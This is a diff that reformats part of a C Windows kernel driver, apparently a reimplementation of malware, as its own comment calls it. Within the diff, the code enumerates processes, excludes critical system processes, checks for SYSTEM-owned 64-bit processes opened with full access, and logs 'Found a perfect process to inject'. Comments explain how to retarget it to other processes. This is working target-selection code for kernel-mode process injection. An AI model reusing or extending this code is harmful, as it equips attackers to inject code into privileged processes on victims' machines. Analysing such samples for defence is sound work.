@@ -15,103 +15,250 @@ Copyright (c) Fluxuss Software Security, LLC
 #include "ProcessHeuristics.h"
 
 
-BOOLEAN CheckProcess64(HANDLE hProc) {
+BOOLEAN CheckProcess64(
+    
+    _In_ HANDLE hProc
+
+) {
 
     UNICODE_STRING routineName;
 
-    RtlInitUnicodeString(&routineName, L"ZwQueryInformationProcess");
+    RtlInitUnicodeString(
+        
+        _Out_ &routineName,
+        _In_ L"ZwQueryInformationProcess"
+    
+    );
 
-    ZwQueryInformationProcess = (QUERY_INFO_PROCESS)MmGetSystemRoutineAddress(&routineName);
+    ZwQueryInformationProcess = ( QUERY_INFO_PROCESS )MmGetSystemRoutineAddress(
+        
+        _In_ &routineName
+    
+    );
 
     SYSTEM_PROCESSES* sysProcess;
 
-    sysProcess = (SYSTEM_PROCESSES*)64;
+    sysProcess = ( SYSTEM_PROCESSES* )64;
 
-    if (ZwQueryInformationProcess == NULL) {
+    if ( ZwQueryInformationProcess == NULL ) {
 
-        DbgPrintEx(0, 0, "Error when ZwQueryInformationProcess");
+        DbgPrintEx(
+        
+            _In_ 0,
+            _In_ 0,
+            _In_ "Error when ZwQueryInformationProcess"
+        
+        );
 
         return FALSE;
     }
 
-    return NT_SUCCESS(ZwQueryInformationProcess(hProc, ProcessBasicInformation, &sysProcess, sizeof(SYSTEM_PROCESSES), NULL));
+    return NT_SUCCESS( ZwQueryInformationProcess(
+        
+        _In_ hProc,
+        _In_ ProcessBasicInformation,
+        _Out_ &sysProcess,
+        _In_ sizeof( SYSTEM_PROCESSES ),
+        _Out_ NULL
+    
+    ) );
 }
 
-BOOLEAN ExecuteCheckingSecurityIdentifiers(PEPROCESS* peProcess, UNICODE_STRING* unicodePermission) {
+BOOLEAN ExecuteCheckingSecurityIdentifiers(
+    
+    _In_ PEPROCESS* peProcess,
+    _In_ UNICODE_STRING* unicodePermission
 
-    PACCESS_TOKEN pObject = PsReferencePrimaryToken(*peProcess);
+) {
+
+    PACCESS_TOKEN pObject = PsReferencePrimaryToken(
+        
+        _Inout_ *peProcess
+    
+    );
 
     KPROCESSOR_MODE kAccessMode = 0;
 
     HANDLE hToken = 0;
 
-    NTSTATUS status = ObOpenObjectByPointer(pObject, 0, NULL, 8, NULL, kAccessMode, &hToken);
+    NTSTATUS status = ObOpenObjectByPointer(
+        
+        _In_ pObject,
+        _In_ 0,
+        _In_ NULL,
+        _In_ 8,
+        _In_ NULL,
+        _In_ kAccessMode,
+        _Out_ &hToken
+    
+    );
 
-    ObDereferenceObject(pObject);
+    ObDereferenceObject(
+        
+        _In_ pObject
+    
+    );
 
-    if (status < 0) return FALSE;
+    if ( status < 0 ) return FALSE;
 
     ULONG uReturnLength = 0;
 
-    status = ZwQueryInformationToken(hToken, TokenUser, NULL, 0, &uReturnLength);
+    status = ZwQueryInformationToken(
+        
+        _In_ hToken,
+        _In_ TokenUser,
+        _Out_ NULL,
+        _In_ 0,
+        _Out_ &uReturnLength
+    
+    );
 
-    if (status != STATUS_BUFFER_TOO_SMALL) {
+    if ( status != STATUS_BUFFER_TOO_SMALL ) {
 
-        ZwClose(hToken);
-
-        return FALSE;
-    }
-
-    PVOID pTokenInformation = ExAllocatePoolWithTag(NonPagedPool, uReturnLength, 'xpp');
-
-    if (pTokenInformation)
-        status = ZwQueryInformationToken(hToken, TokenUser, pTokenInformation, uReturnLength, &uReturnLength);
-
-    if (status < 0 || !pTokenInformation) {
-
-        if (pTokenInformation)
-            ExFreePoolWithTag(pTokenInformation, 'xpp');
-
-        ZwClose(hToken);
+        ZwClose( 
+            
+            _In_ hToken
+        
+        );
 
         return FALSE;
     }
 
-    ZwClose(hToken);
+    PVOID pTokenInformation = ExAllocatePoolWithTag(
+        
+        _In_ NonPagedPool,
+        _In_ uReturnLength,
+        _In_ 'xpp'
+    
+    );
 
-    if (!MmIsAddressValid(pTokenInformation) || !MmIsAddressValid(*(PVOID*)pTokenInformation)) return FALSE;
+    if ( pTokenInformation )
+        status = ZwQueryInformationToken(
+            
+            _In_ hToken,
+            _In_ TokenUser,
+            _Out_ pTokenInformation,
+            _In_ uReturnLength,
+            _Out_ &uReturnLength
+        
+        );
 
-    if (MmIsAddressValid(*(PVOID*)pTokenInformation)) status = RtlConvertSidToUnicodeString(unicodePermission, *(PSID*)pTokenInformation, TRUE);
+    if ( status < 0 || !pTokenInformation ) {
+
+        if ( pTokenInformation )
+            ExFreePoolWithTag(
+                
+                _In_ pTokenInformation,
+                _In_ 'xpp'
+            
+            );
+
+        ZwClose(
+            
+            _In_ hToken
+        
+        );
+
+        return FALSE;
+    }
+
+    ZwClose(
+        
+        _In_ hToken
+    
+    );
+
+    if ( !MmIsAddressValid(
+        
+        _In_ pTokenInformation
+    
+    ) || !MmIsAddressValid(
+        
+        _In_ *( PVOID* )pTokenInformation
+    
+    ) ) return FALSE;
+
+    if ( MmIsAddressValid(
+        
+        _In_ *( PVOID* )pTokenInformation
+    
+    ) ) status = RtlConvertSidToUnicodeString(
+        
+        _Inout_ unicodePermission,
+        _In_ *( PSID* )pTokenInformation,
+        _In_ TRUE
+    
+    );
     else status = STATUS_UNSUCCESSFUL;
 
-    ExFreePoolWithTag(pTokenInformation, 0);
+    ExFreePoolWithTag(
+        
+        _In_ pTokenInformation,
+        _In_ 0
+    
+    );
 
-    return NT_SUCCESS(status);
+    return NT_SUCCESS( status );
 }
 
-BOOLEAN CheckAdjustSecurityIdentifiers(PEPROCESS* peProcess) {
+BOOLEAN CheckAdjustSecurityIdentifiers(
+    
+    _In_ PEPROCESS* peProcess
+
+) {
 
     UNICODE_STRING string;
 
-    return ExecuteCheckingSecurityIdentifiers(peProcess, &string) && wcscmp(string.Buffer, L"S-1-5-18") == 0;
+    return ExecuteCheckingSecurityIdentifiers(
+        
+        _In_ peProcess,
+        _In_ &string
+    
+    ) && wcscmp(_In_ string.Buffer, _In_ L"S-1-5-18" ) == 0;
 
 }
 
-BOOLEAN CompareString(WCHAR* stringToCompare, WCHAR* StringToFind) {
+BOOLEAN CompareString(
+    
+    _In_ WCHAR* stringToCompare,
+    _In_ WCHAR* StringToFind
+
+) {
 
     UNICODE_STRING uStringOne;
     UNICODE_STRING uStringTwo;
 
-    memset(&uStringOne, 0, sizeof(uStringOne));
-    memset(&uStringTwo, 0, sizeof(uStringTwo));
+    memset( _Out_ &uStringOne, _In_ 0, _In_ sizeof( uStringOne ) );
+    memset( _Out_ &uStringTwo, _In_ 0, _In_ sizeof( uStringTwo ) );
 
-    RtlInitUnicodeString(&uStringOne, stringToCompare);
-    RtlInitUnicodeString(&uStringTwo, StringToFind);
+    RtlInitUnicodeString(
+        
+        _Out_ &uStringOne,
+        _In_ stringToCompare
+    
+    );
+    
+    RtlInitUnicodeString(
+        
+        _Out_ &uStringTwo,
+        _In_ StringToFind
+    
+    );
 
-    return RtlCompareUnicodeString(&uStringOne, &uStringTwo, TRUE) == 0;
+    return RtlCompareUnicodeString(
+        
+        _In_ &uStringOne,
+        _In_ &uStringTwo,
+        _In_ TRUE
+    
+    ) == 0;
 }
 
-size_t MoveArgumentToStackAndMoveBackToEaxRegister(size_t p1) {
+size_t MoveArgumentToStackAndMoveBackToEaxRegister(
+    
+    _In_ size_t p1
+
+) {
     /*
         move_argument_stack_and_move_back_ret_register proc near
             parametro_variavel = dword ptr  8
@@ -124,21 +271,45 @@ size_t MoveArgumentToStackAndMoveBackToEaxRegister(size_t p1) {
     return p1;
 }
 
-NTSTATUS OpenTargetProcess(SIZE_T* pPID) {
+NTSTATUS OpenTargetProcess(
+    
+    _In_ SIZE_T* pPID
+
+) {
 
     ULONG ulReturnLenght = 0;
 
-    auto ntStatus = ZwQuerySystemInformation(SystemInformationClass_FLAG, NULL, 0, &ulReturnLenght);
+    auto ntStatus = ZwQuerySystemInformation(
+        
+        _In_ SystemInformationClass_FLAG,
+        _Inout_ NULL,
+        _In_ 0,
+        _Out_opt_ &ulReturnLenght
+    
+    );
 
-    if (ntStatus != STATUS_INFO_LENGTH_MISMATCH) return ntStatus;
+    if ( ntStatus != STATUS_INFO_LENGTH_MISMATCH ) return ntStatus;
 
-    SYSTEM_PROCESSES* systemProcess = (SYSTEM_PROCESSES*)ExAllocatePoolWithTag(NonPagedPool, 2 * ulReturnLenght, 'xp'); // yes this malware use the 'xp' for the tag name
+    SYSTEM_PROCESSES* systemProcess = ( SYSTEM_PROCESSES* )ExAllocatePoolWithTag(
+        
+        _In_ NonPagedPool,
+        _In_ 2 * ulReturnLenght,
+        _In_ 'xp'
+    
+    ); // yes this malware use the 'xp' for the tag name
 
-    if (!systemProcess) return STATUS_NO_MEMORY;
+    if ( !systemProcess ) return STATUS_NO_MEMORY;
 
-    ntStatus = ZwQuerySystemInformation(SystemInformationClass_FLAG, systemProcess, 2 * ulReturnLenght, NULL);
+    ntStatus = ZwQuerySystemInformation(
+        
+        _In_ SystemInformationClass_FLAG,
+        _Inout_ systemProcess,
+        _In_ 2 * ulReturnLenght,
+        _Out_opt_ NULL
+    
+    );
 
-    if (NT_SUCCESS(ntStatus)) {
+    if ( NT_SUCCESS( ntStatus ) ) {
 
         BOOLEAN bFound = 0;
         
@@ -146,73 +317,122 @@ NTSTATUS OpenTargetProcess(SIZE_T* pPID) {
 
         do {
 
-            if (i->ProcessId != MoveArgumentToStackAndMoveBackToEaxRegister(4)
-                && i->InheritedFromProcessId != MoveArgumentToStackAndMoveBackToEaxRegister(4)
+            if ( 
+                
+                i->ProcessId != MoveArgumentToStackAndMoveBackToEaxRegister( _In_ 4 )
+                && i->InheritedFromProcessId != MoveArgumentToStackAndMoveBackToEaxRegister( _In_ 4 )
 
                 //The Driver will compare for process into your blacklist
-                && !CompareString(i->ProcessName.Buffer, L"wininit.exe")
-                && !CompareString(i->ProcessName.Buffer, L"csrss.exe")
-                && !CompareString(i->ProcessName.Buffer, L"smss.exe")
-                && !CompareString(i->ProcessName.Buffer, L"services.exe")
-                && !CompareString(i->ProcessName.Buffer, L"winlogon.exe")
-                && !CompareString(i->ProcessName.Buffer, L"lsass.exe")
+                && !CompareString( _In_ i->ProcessName.Buffer, _In_ L"wininit.exe" )
+                && !CompareString( _In_ i->ProcessName.Buffer, _In_ L"csrss.exe" )
+                && !CompareString( _In_ i->ProcessName.Buffer, _In_ L"smss.exe" )
+                && !CompareString( _In_ i->ProcessName.Buffer, _In_ L"services.exe" )
+                && !CompareString( _In_ i->ProcessName.Buffer, _In_ L"winlogon.exe" )
+                && !CompareString( _In_ i->ProcessName.Buffer, _In_ L"lsass.exe" )
+                
                 ) {
 
                 PEPROCESS peProcess = 0, peProcess2;
 
-                if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)i->ProcessId, &peProcess))) {
+                if ( NT_SUCCESS( PsLookupProcessByProcessId(
+                    
+                    _In_ ( HANDLE )i->ProcessId,
+                    _Outptr_ &peProcess
+                
+                ) ) ) {
 
-                    if (i->ProcessId != *pPID) {
+                    if ( i->ProcessId != *pPID ) {
 
-                        ntStatus = PsLookupProcessByProcessId((HANDLE)i->ProcessId, &peProcess2);
+                        ntStatus = PsLookupProcessByProcessId(
+                            
+                            _In_ ( HANDLE )i->ProcessId,
+                            _Outptr_ &peProcess2
+                        
+                        );
 
-                        if (!ntStatus) {
+                        if ( !ntStatus ) {
 
                             BOOLEAN bFlag2 = FALSE;
 
                             KAPC_STATE kApcState;
 
-                            KeStackAttachProcess(peProcess2, &kApcState);
+                            KeStackAttachProcess(
+                                
+                                _Inout_ peProcess2,
+                                _Out_ &kApcState
+                            
+                            );
                             
                             // se quser utilizar outro processo edite essa linha ->  CompareString(i->ProcessName.Buffer, L"brave.exe")
                             // apenas lembre que o processo precisa ser de x64
-                            if (CheckAdjustSecurityIdentifiers(&peProcess2)) {
+                            if ( CheckAdjustSecurityIdentifiers( 
+                                
+                                _In_ &peProcess2
+                            
+                            ) ) {
 
                                 OBJECT_ATTRIBUTES objectAtributes;
                                 objectAtributes.Length = 48;
-                                memset(&objectAtributes.RootDirectory, 0, 20);
+                                
+                                memset( _Out_ &objectAtributes.RootDirectory, _In_ 0, _In_ 20 );
+                                
                                 objectAtributes.SecurityDescriptor = 0i64;
                                 objectAtributes.SecurityQualityOfService = 0i64;
                                 CLIENT_ID clientId;
-                                clientId.UniqueProcess = (HANDLE)i->ProcessId;
-                                clientId.UniqueThread = (HANDLE)0;
+
+                                clientId.UniqueProcess = ( HANDLE )i->ProcessId;
+                                clientId.UniqueThread = ( HANDLE )0;
 
                                 HANDLE hProcess;
 
-                                ntStatus = ZwOpenProcess(&hProcess, 0x1FFFFFu, &objectAtributes, &clientId);
+                                ntStatus = ZwOpenProcess(
+                                    
+                                    _Out_ &hProcess,
+                                    _In_ 0x1FFFFF,
+                                    _In_ &objectAtributes,
+                                    _In_opt_ &clientId
+                                
+                                );
 
-                                if (NT_SUCCESS(ntStatus)) {
+                                if ( NT_SUCCESS( ntStatus ) ) {
 
-                                    if (!CheckProcess64(hProcess)) {
+                                    if ( !CheckProcess64( 
+                                        
+                                        _In_ hProcess
+                                    
+                                    ) ) {
 
-                                        if (bFound)
-                                            bFound = FALSE;
-                                        else
-                                            bFlag2 = TRUE;
+                                        if ( bFound ) bFound = FALSE;
+                                        else bFlag2 = TRUE;
 
                                     }
 
-                                    ZwClose(hProcess);
+                                    ZwClose(
+                                        
+                                        _In_ hProcess
+                                    
+                                    );
 
                                 }
 
                             }
 
-                            KeUnstackDetachProcess(&kApcState);
+                            KeUnstackDetachProcess(
+                                
+                                _In_ &kApcState
+                            
+                            );
 
-                            if (bFlag2) {
+                            if ( bFlag2 ) {
 
-                                DbgPrintEx(0, 0, "Found a perfect process to inject: %ls", i->ProcessName.Buffer);
+                                DbgPrintEx(
+                                    
+                                    _In_ 0,
+                                    _In_ 0,
+                                    _In_ "Found a perfect process to inject: %ls",
+                                    i->ProcessName.Buffer
+                                
+                                );
 
                                 *pPID = i->ProcessId;
 
@@ -227,14 +447,19 @@ NTSTATUS OpenTargetProcess(SIZE_T* pPID) {
 
             }
 
-            i = (SYSTEM_PROCESSES*)((unsigned char*)i + i->NextEntryDelta);
+            i = ( SYSTEM_PROCESSES* )( ( unsigned char* )i + i->NextEntryDelta );
 
-        } while (i->NextEntryDelta);
+        } while ( i->NextEntryDelta );
 
     }
     else {
 
-        ExFreePoolWithTag(systemProcess, 'xp');
+        ExFreePoolWithTag(
+            
+            _In_ systemProcess,
+            _In_ 'xp'
+        
+        );
 
         return ntStatus;
     }
